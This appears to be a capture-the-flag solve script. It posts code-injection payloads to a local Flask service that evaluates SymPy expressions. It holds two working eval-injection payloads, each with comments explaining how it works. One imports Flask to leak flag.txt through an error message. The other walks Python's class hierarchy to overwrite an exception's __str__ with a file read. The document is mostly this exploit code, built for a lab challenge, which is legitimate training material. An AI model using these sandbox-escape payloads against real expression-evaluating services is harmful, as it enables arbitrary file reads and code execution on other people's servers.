import requests
import re

challenge_endpoint = "http://localhost:8080/solve"

# Solve 1 - easier solve
# Import Flask via __import__, throw an error to interrupt any further
# processing of the request, include in the error description the contents
# of the flag
payload = "__import__('flask').abort(500, description=open('flag.txt').read())"

r = requests.post(challenge_endpoint, json={"expression": payload})
print(f"flag = {re.findall(r"sgctf{.*}", r.text)[0]}")

# Solve 2 - cooler solve
# Extract the ExprError class via MRO access.
#   a -> SymPy symbol object
#   .__class__.__mro__[-1] -> the 'object' data type
#   .__subclassses__() -> get all subclasses of object (any class defined in current scope)
#   [-1] -> ExprError is the last class to be defined, after all imported classes
# Set the ExprError __str__ attribute = open('flag.txt).read
# When str(e) is called on ExprError, this invokes .read, reading the file contents
# str(e) is called automatically due to parsing the expression being invalid SymPy
# returning the flag
# Note that this solve only works with Docker, not running flask locally (due to hotreload).

payload = "setattr(a.__class__.__mro__[-1].__subclasses__()[-1],'__str__', open('flag.txt').read)"
r = requests.post(challenge_endpoint, json={"expression": payload})
print(f"flag = {r.json()["error"]}")
